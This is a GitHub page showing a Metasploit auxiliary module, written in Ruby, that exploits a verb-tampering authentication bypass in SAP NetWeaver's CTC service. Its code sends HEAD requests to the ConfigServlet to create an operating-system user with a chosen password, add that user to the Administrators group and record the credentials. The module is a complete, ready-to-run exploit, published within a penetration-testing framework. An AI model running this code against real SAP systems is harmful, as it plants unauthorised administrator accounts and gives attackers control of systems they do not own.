    <li><a href="/rapid7/metasploit-framework/commits/master" class="js-selected-navigation-item tabnav-tab" data-selected-links="repo_commits /rapid7/metasploit-framework/commits/master">Commits</a></li>
    <li><a href="/rapid7/metasploit-framework/branches" class="js-selected-navigation-item tabnav-tab" data-selected-links="repo_branches /rapid7/metasploit-framework/branches" rel="nofollow">Branches <span class="counter ">7</span></a></li>
  </ul>

</div>

  
  
  


            
          </div>
        </div><!-- /.repohead -->

        <div id="js-repo-pjax-container" class="container context-loader-container" data-pjax-container>
          


<!-- blob contrib key: blob_contributors:v21:5145469d4c9817bca16327251ce0a282 -->
<!-- blob contrib frag key: views10/v8/blob_contributors:v21:5145469d4c9817bca16327251ce0a282 -->

<div id="slider">
    <div class="frame-meta">

      <p title="This is a placeholder element" class="js-history-link-replace hidden"></p>

        <a href="/rapid7/metasploit-framework/find/master" class="js-slide-to" data-hotkey="t" style="display:none">Show File Finder</a>

        <div class="breadcrumb">
          <span class='bold'><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/rapid7/metasploit-framework" class="js-slide-to" data-branch="master" data-direction="back" itemscope="url"><span itemprop="title">metasploit-framework</span></a></span></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/rapid7/metasploit-framework/tree/master/modules" class="js-slide-to" data-branch="master" data-direction="back" itemscope="url"><span itemprop="title">modules</span></a></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/rapid7/metasploit-framework/tree/master/modules/auxiliary" class="js-slide-to" data-branch="master" data-direction="back" itemscope="url"><span itemprop="title">auxiliary</span></a></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner" class="js-slide-to" data-branch="master" data-direction="back" itemscope="url"><span itemprop="title">scanner</span></a></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner/sap" class="js-slide-to" data-branch="master" data-direction="back" itemscope="url"><span itemprop="title">sap</span></a></span><span class="separator"> / </span><strong class="final-path">sap_ctc_verb_tampering_user_mgmt.rb</strong> <span class="js-zeroclipboard zeroclipboard-button" data-clipboard-text="modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" data-copied-hint="copied!" title="copy to clipboard"><span class="octicon octicon-clippy"></span></span>
        </div>


        
  <div class="commit file-history-tease">
    <img class="main-avatar" height="24" src="https://secure.gravatar.com/avatar/a678999a2eafe7744646388645761d90?s=140&amp;d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-user-420.png" width="24" />
    <span class="author"><a href="/jvazquez-r7" rel="author">jvazquez-r7</a></span>
    <time class="js-relative-date" datetime="2013-05-16T08:42:09-07:00" title="2013-05-16 08:42:09">May 16, 2013</time>
    <div class="commit-title">
        <a href="/rapid7/metasploit-framework/commit/c21035c0b9fdba52d5a1eead2fc267812bddd2a9" class="message" data-pjax="true">Add final cleanup for sap_ctc_verb_tampering_user_mgmt</a>
    </div>

    <div class="participation">
      <p class="quickstat"><a href="#blob_contributors_box" rel="facebox"><strong>1</strong> contributor</a></p>
      
    </div>
    <div id="blob_contributors_box" style="display:none">
      <h2 class="facebox-header">Users who have contributed to this file</h2>
      <ul class="facebox-user-list">
        <li class="facebox-user-list-item">
          <img height="24" src="https://secure.gravatar.com/avatar/a678999a2eafe7744646388645761d90?s=140&amp;d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-user-420.png" width="24" />
          <a href="/jvazquez-r7">jvazquez-r7</a>
        </li>
      </ul>
    </div>
  </div>


    </div><!-- ./.frame-meta -->

    <div class="frames">
      <div class="frame" data-permalink-url="/rapid7/metasploit-framework/blob/df27e3e76cc815d17cb8efd86b39a2dd7c4a373f/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" data-title="metasploit-framework/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb at master · rapid7/metasploit-framework · GitHub" data-type="blob">

        <div id="files" class="bubble">
          <div class="file">
            <div class="meta">
              <div class="info">
                <span class="icon"><b class="octicon octicon-file-text"></b></span>
                <span class="mode" title="File Mode">file</span>
                  <span>109 lines (99 sloc)</span>
                <span>3.792 kb</span>
              </div>
              <div class="actions">
                <div class="button-group">
                      <a class="minibutton js-entice" href=""
                         data-entice="You must be signed in and on a branch to make or propose changes">Edit</a>
                  <a href="/rapid7/metasploit-framework/raw/master/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="button minibutton " id="raw-url">Raw</a>
                    <a href="/rapid7/metasploit-framework/blame/master/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="button minibutton ">Blame</a>
                  <a href="/rapid7/metasploit-framework/commits/master/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="button minibutton " rel="nofollow">History</a>
                </div><!-- /.button-group -->
              </div><!-- /.actions -->

            </div>
                <div class="blob-wrapper data type-ruby js-blob-data">
      <table class="file-code file-diff">
        <tr class="file-code-line">
          <td class="blob-line-nums">
            <span id="L1" rel="#L1">1</span>
<span id="L2" rel="#L2">2</span>
<span id="L3" rel="#L3">3</span>
<span id="L4" rel="#L4">4</span>
<span id="L5" rel="#L5">5</span>
<span id="L6" rel="#L6">6</span>
<span id="L7" rel="#L7">7</span>
<span id="L8" rel="#L8">8</span>
<span id="L9" rel="#L9">9</span>
<span id="L10" rel="#L10">10</span>
<span id="L11" rel="#L11">11</span>
<span id="L12" rel="#L12">12</span>
<span id="L13" rel="#L13">13</span>
<span id="L14" rel="#L14">14</span>
<span id="L15" rel="#L15">15</span>
<span id="L16" rel="#L16">16</span>
<span id="L17" rel="#L17">17</span>
<span id="L18" rel="#L18">18</span>
<span id="L19" rel="#L19">19</span>
<span id="L20" rel="#L20">20</span>
<span id="L21" rel="#L21">21</span>
<span id="L22" rel="#L22">22</span>
<span id="L23" rel="#L23">23</span>
<span id="L24" rel="#L24">24</span>
<span id="L25" rel="#L25">25</span>
<span id="L26" rel="#L26">26</span>
<span id="L27" rel="#L27">27</span>
<span id="L28" rel="#L28">28</span>
<span id="L29" rel="#L29">29</span>
<span id="L30" rel="#L30">30</span>
<span id="L31" rel="#L31">31</span>
<span id="L32" rel="#L32">32</span>
<span id="L33" rel="#L33">33</span>
<span id="L34" rel="#L34">34</span>
<span id="L35" rel="#L35">35</span>
<span id="L36" rel="#L36">36</span>
<span id="L37" rel="#L37">37</span>
<span id="L38" rel="#L38">38</span>
<span id="L39" rel="#L39">39</span>
<span id="L40" rel="#L40">40</span>
<span id="L41" rel="#L41">41</span>
<span id="L42" rel="#L42">42</span>
<span id="L43" rel="#L43">43</span>
<span id="L44" rel="#L44">44</span>
<span id="L45" rel="#L45">45</span>
<span id="L46" rel="#L46">46</span>
<span id="L47" rel="#L47">47</span>
<span id="L48" rel="#L48">48</span>
<span id="L49" rel="#L49">49</span>
<span id="L50" rel="#L50">50</span>
<span id="L51" rel="#L51">51</span>
<span id="L52" rel="#L52">52</span>
<span id="L53" rel="#L53">53</span>
<span id="L54" rel="#L54">54</span>
<span id="L55" rel="#L55">55</span>
<span id="L56" rel="#L56">56</span>
<span id="L57" rel="#L57">57</span>
<span id="L58" rel="#L58">58</span>
<span id="L59" rel="#L59">59</span>
<span id="L60" rel="#L60">60</span>
<span id="L61" rel="#L61">61</span>
<span id="L62" rel="#L62">62</span>
<span id="L63" rel="#L63">63</span>
<span id="L64" rel="#L64">64</span>
<span id="L65" rel="#L65">65</span>
<span id="L66" rel="#L66">66</span>
<span id="L67" rel="#L67">67</span>
<span id="L68" rel="#L68">68</span>
<span id="L69" rel="#L69">69</span>
<span id="L70" rel="#L70">70</span>
<span id="L71" rel="#L71">71</span>
<span id="L72" rel="#L72">72</span>
<span id="L73" rel="#L73">73</span>
<span id="L74" rel="#L74">74</span>
<span id="L75" rel="#L75">75</span>
<span id="L76" rel="#L76">76</span>
<span id="L77" rel="#L77">77</span>
<span id="L78" rel="#L78">78</span>
<span id="L79" rel="#L79">79</span>
<span id="L80" rel="#L80">80</span>
<span id="L81" rel="#L81">81</span>
<span id="L82" rel="#L82">82</span>
<span id="L83" rel="#L83">83</span>
<span id="L84" rel="#L84">84</span>
<span id="L85" rel="#L85">85</span>
<span id="L86" rel="#L86">86</span>
<span id="L87" rel="#L87">87</span>
<span id="L88" rel="#L88">88</span>
<span id="L89" rel="#L89">89</span>
<span id="L90" rel="#L90">90</span>
<span id="L91" rel="#L91">91</span>
<span id="L92" rel="#L92">92</span>
<span id="L93" rel="#L93">93</span>
<span id="L94" rel="#L94">94</span>
<span id="L95" rel="#L95">95</span>
<span id="L96" rel="#L96">96</span>
<span id="L97" rel="#L97">97</span>
<span id="L98" rel="#L98">98</span>
<span id="L99" rel="#L99">99</span>
<span id="L100" rel="#L100">100</span>
<span id="L101" rel="#L101">101</span>
<span id="L102" rel="#L102">102</span>
<span id="L103" rel="#L103">103</span>
<span id="L104" rel="#L104">104</span>
<span id="L105" rel="#L105">105</span>
<span id="L106" rel="#L106">106</span>
<span id="L107" rel="#L107">107</span>
<span id="L108" rel="#L108">108</span>

          </td>
          <td class="blob-line-code">
                  <div class="highlight"><pre><div class='line' id='LC1'><span class="c1">##</span></div><div class='line' id='LC2'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span></div><div class='line' id='LC3'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span></div><div class='line' id='LC4'><span class="c1"># Framework web site for more information on licensing and terms of use.</span></div><div class='line' id='LC5'><span class="c1"># http://metasploit.com/framework/</span></div><div class='line' id='LC6'><span class="c1">##</span></div><div class='line' id='LC7'><br/></div><div class='line' id='LC8'><span class="c1">##</span></div><div class='line' id='LC9'><span class="c1"># This module is based on, inspired by, or is a port of a plugin available in</span></div><div class='line' id='LC10'><span class="c1"># the Onapsis Bizploit Opensource ERP Penetration Testing framework -</span></div><div class='line' id='LC11'><span class="c1"># http://www.onapsis.com/research-free-solutions.php.</span></div><div class='line' id='LC12'><span class="c1"># Mariano Nunez (the author of the Bizploit framework) helped me in my efforts</span></div><div class='line' id='LC13'><span class="c1"># in producing the Metasploit modules and was happy to share his knowledge and</span></div><div class='line' id='LC14'><span class="c1"># experience - a very cool guy.</span></div><div class='line' id='LC15'><span class="c1">#</span></div><div class='line' id='LC16'><span class="c1"># The following guys from ERP-SCAN deserve credit for their contributions -</span></div><div class='line' id='LC17'><span class="c1"># Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and</span></div><div class='line' id='LC18'><span class="c1"># Dmitry Evdokimov.</span></div><div class='line' id='LC19'><span class="c1">#</span></div><div class='line' id='LC20'><span class="c1"># I&#39;d also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis</span></div><div class='line' id='LC21'><span class="c1"># who have Beta tested the modules and provided excellent feedback. Some people</span></div><div class='line' id='LC22'><span class="c1"># just seem to enjoy hacking SAP :)</span></div><div class='line' id='LC23'><span class="c1">##</span></div><div class='line' id='LC24'><br/></div><div class='line' id='LC25'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span></div><div class='line' id='LC26'><br/></div><div class='line' id='LC27'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Auxiliary</span></div><div class='line' id='LC28'>	<span class="kp">include</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Exploit</span><span class="o">::</span><span class="ss">Remote</span><span class="p">:</span><span class="ss">:HttpClient</span></div><div class='line' id='LC29'>	<span class="kp">include</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Auxiliary</span><span class="o">::</span><span class="no">Report</span></div><div class='line' id='LC30'>	<span class="kp">include</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Auxiliary</span><span class="o">::</span><span class="no">Scanner</span></div><div class='line' id='LC31'><br/></div><div class='line' id='LC32'>	<span class="k">def</span> <span class="nf">initialize</span></div><div class='line' id='LC33'>		<span class="k">super</span><span class="p">(</span></div><div class='line' id='LC34'>			<span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;SAP CTC Service Verb Tampering User Management&#39;</span><span class="p">,</span></div><div class='line' id='LC35'>			<span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="sx">%q{</span></div><div class='line' id='LC36'><span class="sx">					This module exploits an authentication bypass vulnerability in SAP NetWeaver</span></div><div class='line' id='LC37'><span class="sx">				CTC service. The service is vulnerable to verb tampering allowing for unauthorised</span></div><div class='line' id='LC38'><span class="sx">				OS user management. Information about resolution should be available at SAP notes</span></div><div class='line' id='LC39'><span class="sx">				1589525 and 1624450 (authentication required).</span></div><div class='line' id='LC40'><span class="sx">			}</span><span class="p">,</span></div><div class='line' id='LC41'>			<span class="s1">&#39;References&#39;</span> <span class="o">=&gt;</span></div><div class='line' id='LC42'>				<span class="o">[</span></div><div class='line' id='LC43'>					<span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC44'>					<span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf&#39;</span> <span class="o">]</span></div><div class='line' id='LC45'>				<span class="o">]</span><span class="p">,</span></div><div class='line' id='LC46'>			<span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span></div><div class='line' id='LC47'>				<span class="o">[</span></div><div class='line' id='LC48'>					<span class="s1">&#39;Alexandr Polyakov&#39;</span><span class="p">,</span> <span class="c1"># Vulnerability discovery</span></div><div class='line' id='LC49'>					<span class="s1">&#39;nmonkee&#39;</span> <span class="c1"># Metasploit module</span></div><div class='line' id='LC50'>				<span class="o">]</span><span class="p">,</span></div><div class='line' id='LC51'>			<span class="s1">&#39;License&#39;</span> <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span></div><div class='line' id='LC52'>		<span class="p">)</span></div><div class='line' id='LC53'><br/></div><div class='line' id='LC54'>		<span class="n">register_options</span><span class="p">(</span><span class="o">[</span></div><div class='line' id='LC55'>			<span class="ss">Opt</span><span class="p">:</span><span class="ss">:RPORT</span><span class="p">(</span><span class="mi">50000</span><span class="p">),</span></div><div class='line' id='LC56'>			<span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;USERNAME&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Username to create&#39;</span><span class="p">,</span> <span class="s1">&#39;msf&#39;</span><span class="o">]</span><span class="p">),</span></div><div class='line' id='LC57'>			<span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PASSWORD&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Password for the new user&#39;</span><span class="p">,</span> <span class="s1">&#39;$Metasploit1234$&#39;</span><span class="o">]</span><span class="p">),</span></div><div class='line' id='LC58'>			<span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;GROUP&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Group for the new user&#39;</span><span class="p">,</span> <span class="s1">&#39;Administrators&#39;</span><span class="o">]</span><span class="p">)</span></div><div class='line' id='LC59'>		<span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span></div><div class='line' id='LC60'>	<span class="k">end</span></div><div class='line' id='LC61'><br/></div><div class='line' id='LC62'>	<span class="k">def</span> <span class="nf">run_host</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span></div><div class='line' id='LC63'>		<span class="n">vprint_status</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - Creating User...&quot;</span><span class="p">)</span></div><div class='line' id='LC64'>		<span class="n">uri</span> <span class="o">=</span> <span class="s1">&#39;/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=&#39;</span> <span class="o">+</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;USERNAME&#39;</span><span class="o">]</span> <span class="o">+</span> <span class="s1">&#39;,PASSWORD=&#39;</span> <span class="o">+</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">]</span></div><div class='line' id='LC65'>		<span class="k">if</span> <span class="n">send_request</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span></div><div class='line' id='LC66'>			<span class="n">print_good</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - User </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;USERNAME&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2"> with password </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2"> successfully created&quot;</span><span class="p">)</span></div><div class='line' id='LC67'>		<span class="k">else</span></div><div class='line' id='LC68'>			<span class="k">return</span></div><div class='line' id='LC69'>		<span class="k">end</span></div><div class='line' id='LC70'><br/></div><div class='line' id='LC71'>		<span class="n">vprint_status</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - Adding User to Group...&quot;</span><span class="p">)</span></div><div class='line' id='LC72'>		<span class="n">uri</span> <span class="o">=</span> <span class="s1">&#39;/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=&#39;</span> <span class="o">+</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;USERNAME&#39;</span><span class="o">]</span> <span class="o">+</span> <span class="s1">&#39;,GROUPNAME=&#39;</span> <span class="o">+</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;GROUP&#39;</span><span class="o">]</span></div><div class='line' id='LC73'>		<span class="k">if</span> <span class="n">send_request</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span></div><div class='line' id='LC74'>			<span class="n">print_good</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - User </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;USERNAME&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2"> added to group </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;GROUP&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></div><div class='line' id='LC75'>		<span class="k">else</span></div><div class='line' id='LC76'>			<span class="k">return</span></div><div class='line' id='LC77'>		<span class="k">end</span></div><div class='line' id='LC78'><br/></div><div class='line' id='LC79'>		<span class="n">report_auth_info</span><span class="p">(</span></div><div class='line' id='LC80'>			<span class="ss">:host</span> <span class="o">=&gt;</span> <span class="n">rhost</span><span class="p">,</span></div><div class='line' id='LC81'>			<span class="ss">:port</span> <span class="o">=&gt;</span> <span class="n">rport</span><span class="p">,</span></div><div class='line' id='LC82'>			<span class="ss">:user</span> <span class="o">=&gt;</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;USERNAME&#39;</span><span class="o">]</span><span class="p">,</span></div><div class='line' id='LC83'>			<span class="ss">:pass</span> <span class="o">=&gt;</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">]</span><span class="p">,</span></div><div class='line' id='LC84'>			<span class="ss">:ptype</span> <span class="o">=&gt;</span> <span class="s2">&quot;password&quot;</span><span class="p">,</span></div><div class='line' id='LC85'>			<span class="ss">:active</span> <span class="o">=&gt;</span> <span class="kp">true</span></div><div class='line' id='LC86'>		<span class="p">)</span></div><div class='line' id='LC87'>	<span class="k">end</span></div><div class='line' id='LC88'><br/></div><div class='line' id='LC89'>	<span class="k">def</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span></div><div class='line' id='LC90'>		<span class="k">begin</span></div><div class='line' id='LC91'>			<span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">({</span></div><div class='line' id='LC92'>				<span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="n">uri</span><span class="p">,</span></div><div class='line' id='LC93'>				<span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">,</span></div><div class='line' id='LC94'>				<span class="s1">&#39;ctype&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;text/xml; charset=UTF-8&#39;</span><span class="p">,</span></div><div class='line' id='LC95'>				<span class="s1">&#39;cookie&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;sap-usercontext=sap-language=EN&#39;</span></div><div class='line' id='LC96'>			<span class="p">})</span></div><div class='line' id='LC97'>			<span class="k">if</span> <span class="n">res</span> <span class="ow">and</span> <span class="n">res</span><span class="o">.</span><span class="n">code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">res</span><span class="o">.</span><span class="n">headers</span><span class="o">[</span><span class="s1">&#39;Server&#39;</span><span class="o">]</span> <span class="o">=~</span> <span class="sr">/SAP J2EE Engine/</span></div><div class='line' id='LC98'>				<span class="k">return</span> <span class="kp">true</span></div><div class='line' id='LC99'>			<span class="k">elsif</span> <span class="n">res</span></div><div class='line' id='LC100'>				<span class="n">vprint_error</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - Unexpected Response: </span><span class="si">#{</span><span class="n">res</span><span class="o">.</span><span class="n">code</span><span class="si">}</span><span class="s2"> </span><span class="si">#{</span><span class="n">res</span><span class="o">.</span><span class="n">message</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></div><div class='line' id='LC101'>				<span class="k">return</span> <span class="kp">false</span></div><div class='line' id='LC102'>			<span class="k">end</span></div><div class='line' id='LC103'>		<span class="k">rescue</span> <span class="o">::</span><span class="ss">Rex</span><span class="p">:</span><span class="ss">:ConnectionError</span></div><div class='line' id='LC104'>			<span class="n">vprint_error</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - Unable to connect&quot;</span><span class="p">)</span></div><div class='line' id='LC105'>			<span class="k">return</span> <span class="kp">false</span></div><div class='line' id='LC106'>		<span class="k">end</span></div><div class='line' id='LC107'>	<span class="k">end</span></div><div class='line' id='LC108'><span class="k">end</span></div></pre></div>
          </td>
        </tr>
      </table>
  </div>

          </div>
        </div>

        <a href="#jump-to-line" rel="facebox[.linejump]" data-hotkey="l" class="js-jump-to-line" style="display:none">Jump to Line</a>
        <div id="jump-to-line" style="display:none">
          <form accept-charset="UTF-8" class="js-jump-to-line-form">
            <input class="linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line&hellip;">
            <button type="submit" class="button">Go</button>
          </form>
        </div>

      </div>
    </div>
</div>

<div id="js-frame-loading-template" class="frame frame-loading large-loading-area" style="display:none;">
  <img class="js-frame-loading-spinner" src="https://a248.e.akamai.net/assets.github.com/images/spinners/octocat-spinner-128.gif" height="64" width="64">
</div>


        </div>
      </div>
      <div class="modal-backdrop"></div>
    </div>

      <div id="footer-push"></div><!-- hack for sticky footer -->
    </div><!-- end of wrapper - hack for sticky footer -->

      <!-- footer -->
      <div id="footer">
  <div class="container clearfix">

      <dl class="footer_nav">
        <dt>GitHub</dt>
        <dd><a href="/about">About us</a></dd>
        <dd><a href="/blog">Blog</a></dd>
        <dd><a href="/contact">Contact &amp; support</a></dd>
        <dd><a href="http://enterprise.github.com/">GitHub Enterprise</a></dd>
        <dd><a href="http://status.github.com/">Site status</a></dd>
      </dl>

      <dl class="footer_nav">
        <dt>Applications</dt>
        <dd><a href="http://mac.github.com/">GitHub for Mac</a></dd>
        <dd><a href="http://windows.github.com/">GitHub for Windows</a></dd>
        <dd><a href="http://eclipse.github.com/">GitHub for Eclipse</a></dd>
        <dd><a href="http://mobile.github.com/">GitHub mobile apps</a></dd>
      </dl>

      <dl class="footer_nav">
        <dt>Services</dt>
        <dd><a href="http://get.gaug.es/">Gauges: Web analytics</a></dd>
        <dd><a href="http://speakerdeck.com">Speaker Deck: Presentations</a></dd>
        <dd><a href="https://gist.github.com">Gist: Code snippets</a></dd>
        <dd><a href="http://jobs.github.com/">Job board</a></dd>
      </dl>

      <dl class="footer_nav">
        <dt>Documentation</dt>
        <dd><a href="http://help.github.com/">GitHub Help</a></dd>
        <dd><a href="http://developer.github.com/">Developer API</a></dd>
        <dd><a href="http://github.github.com/github-flavored-markdown/">GitHub Flavored Markdown</a></dd>
        <dd><a href="http://pages.github.com/">GitHub Pages</a></dd>
      </dl>

      <dl class="footer_nav">
        <dt>More</dt>
        <dd><a href="http://training.github.com/">Training</a></dd>
        <dd><a href="/edu">Students &amp; teachers</a></dd>
        <dd><a href="http://shop.github.com">The Shop</a></dd>
        <dd><a href="/plans">Plans &amp; pricing</a></dd>
        <dd><a href="http://octodex.github.com/">The Octodex</a></dd>
      </dl>

      <hr class="footer-divider">


    <p class="right">&copy; 2013 <span title="0.06551s from fe17.rs.github.com">GitHub</span>, Inc. All rights reserved.</p>
    <a class="left" href="/">
      <span class="mega-octicon octicon-mark-github"></span>
    </a>
    <ul id="legal">
        <li><a href="/site/terms">Terms of Service</a></li>
        <li><a href="/site/privacy">Privacy</a></li>
        <li><a href="/security">Security</a></li>
    </ul>

  </div><!-- /.container -->

</div><!-- /.#footer -->


    <div class="fullscreen-overlay js-fullscreen-overlay" id="fullscreen_overlay">
  <div class="fullscreen-container js-fullscreen-container">
    <div class="textarea-wrap">
      <textarea name="fullscreen-contents" id="fullscreen-contents" class="js-fullscreen-contents" placeholder="" data-suggester="fullscreen_suggester"></textarea>
          <div class="suggester-container">
              <div class="suggester fullscreen-suggester js-navigation-container" id="fullscreen_suggester"
                 data-url="/rapid7/metasploit-framework/suggestions/commit">
              </div>
          </div>
    </div>
  </div>
  <div class="fullscreen-sidebar">
    <a href="#" class="exit-fullscreen js-exit-fullscreen tooltipped leftwards" title="Exit Zen Mode">
      <span class="mega-octicon octicon-screen-normal"></span>
    </a>
    <a href="#" class="theme-switcher js-theme-switcher tooltipped leftwards"
      title="Switch themes">
      <span class="octicon octicon-color-mode"></span>
    </a>
  </div>
</div>



    <div id="ajax-error-message" class="flash flash-error">
      <span class="octicon octicon-alert"></span>
      <a href="#" class="octicon octicon-remove-close close ajax-error-dismiss"></a>
      Something went wrong with that request. Please try again.
    </div>

    
    <span id='server_response_time' data-time='0.06594' data-host='fe17'></span>
    
  </body>
</html>

